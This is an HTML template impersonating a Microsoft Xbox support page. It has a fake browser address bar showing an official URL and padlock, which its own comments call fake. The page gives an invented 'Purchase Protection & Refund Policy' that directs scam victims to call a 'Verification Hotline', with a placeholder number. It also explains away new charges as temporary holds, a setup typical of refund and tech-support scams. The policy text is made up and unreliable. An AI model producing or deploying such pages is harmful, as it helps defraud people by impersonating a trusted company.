<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xbox Support - Microsoft Official Policy</title>
    <link rel="icon" href="https://c.s-microsoft.com/favicon.ico?v2" type="image/x-icon">
    <style>
        :root {
            --ms-blue: #0078d4;
            --ms-bg: #f3f3f3;
            --ms-white: #ffffff;
            --ms-text: #1b1b1b;
            --ms-gray: #666666;
            --ms-border: #e0e0e0;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', 'Segoe UI Web', -apple-system, BlinkMacSystemFont, 'Roboto', 'Helvetica Neue', sans-serif;
            background: #e0e0e0;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Fake address bar (visible inside the page) */
        .fake-url-bar {
            width: 100%;
            max-width: 1100px;
            background: #f2f2f2;
            border-bottom: 1px solid #ccc;
            padding: 12px 24px;
            display: flex;
            align-items: center;
            gap: 10px;
            font-size: 14px;
            color: #333;
        }

        .fake-url-bar .padlock {
            color: #27ca40;
        }

        .fake-url-bar .url-text {
            flex: 1;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            color: #555;
        }

        /* Microsoft top navigation */
        .ms-header {
            width: 100%;
            max-width: 1100px;
            background: white;
            padding: 16px 32px;
            display: flex;
            align-items: center;
            gap: 32px;
            border-bottom: 1px solid var(--ms-border);
        }

        .ms-logo {
            height: 22px;
        }

        .ms-nav {
            display: flex;
            gap: 28px;
        }

        .ms-nav a {
            text-decoration: none;
            color: var(--ms-text);
            font-size: 14px;
            font-weight: 500;
            border-bottom: 2px solid transparent;
            transition: border-color 0.2s;
        }

        .ms-nav a:hover {
            border-bottom-color: var(--ms-blue);
        }

        /* Page content */
        .page-background {
            width: 100%;
            max-width: 1100px;
            background: var(--ms-bg);
            padding: 44px 36px 60px;
        }

        .article-card {
            max-width: 860px;
            margin: 0 auto;
            background: white;
            padding: 48px 52px;
            border-radius: 4px;
            box-shadow: 0 1px 4px rgba(0,0,0,0.08);
        }

        .article-card h1 {
            font-size: 30px;
            font-weight: 600;
            color: var(--ms-text);
            margin-bottom: 6px;
            letter-spacing: -0.2px;
        }

        .effective-date {
            font-size: 13px;
            color: var(--ms-gray);
            margin-bottom: 32px;
        }

        .article-card h2 {
            font-size: 22px;
            font-weight: 600;
            color: var(--ms-text);
            margin-top: 36px;
            margin-bottom: 12px;
        }

        .article-card p {
            font-size: 15px;
            line-height: 1.7;
            color: var(--ms-text);
            margin-bottom: 16px;
        }

        .highlight-box {
            background-color: #e8f0fe;
            border-left: 4px solid var(--ms-blue);
            padding: 20px 24px;
            margin: 32px 0;
            border-radius: 0 4px 4px 0;
        }

        .highlight-box .phone-number {
            font-size: 20px;
            color: var(--ms-blue);
            font-weight: 700;
            letter-spacing: 0.5px;
        }

        .footer-note {
            margin-top: 40px;
            padding-top: 24px;
            border-top: 1px solid var(--ms-border);
            font-size: 12px;
            color: #888;
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <!-- Fake address bar (simulates the browser's address bar on the official page) -->
    <div class="fake-url-bar">
        <span class="padlock">🔒</span>
        <span class="url-text">https://support.xbox.com/consumer/purchase-protection</span>
    </div>

    <!-- Microsoft header -->
    <div class="ms-header">
        <img class="ms-logo" src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft">
        <div class="ms-nav">
            <a href="#">Games</a>
            <a href="#">Support</a>
            <a href="#">My Account</a>
            <a href="#">Billing</a>
        </div>
    </div>

    <!-- Main content -->
    <div class="page-background">
        <div class="article-card">
            <h1>Xbox Digital Purchase Protection & Refund Policy<br>(Consumer Safety Update)</h1>
            <p class="effective-date">Effective as of April 2026</p>

            <h2>1. Scam & Fraud Protection</h2>
            <p>Microsoft is committed to protecting our users from unauthorized transactions and fraudulent activity. In accordance with the Microsoft Services Agreement, any user who believes they have been the victim of a scam or phishing attempt must verify their identity and intent to secure a full refund of all eligible digital purchases made within the last 30 days.</p>

            <h2>2. 24‑Hour Reimbursement Window</h2>
            <p>Once identity verification is complete and a valid proof of purchase (Order Number or Gift Card Code) is submitted, Microsoft will process a full reversal of charges to the original payment method or Microsoft Account Balance within <strong>24 hours</strong>. During this 24‑hour processing period, additional pending transactions may appear; these are temporary holds and will be voided upon refund completion.</p>

            <h2>3. Verification Contact</h2>
            <p>For escalated support, a dedicated Microsoft Consumer Safety agent is assigned to this case. To expedite your refund and remove the 24‑hour processing hold, please contact our Verification Department directly at the number below. This line is monitored 24/7.</p>

            <div class="highlight-box">
                <p>US Verification Hotline: <span class="phone-number">[ INSERT PHONE NUMBER HERE ]</span></p>
            </div>

            <div class="footer-note">
                <p>© 2026 Microsoft Corporation. All rights reserved. This document is for informational purposes only and does not constitute a legal agreement.</p>
            </div>
        </div>
    </div>
</body>
</html>
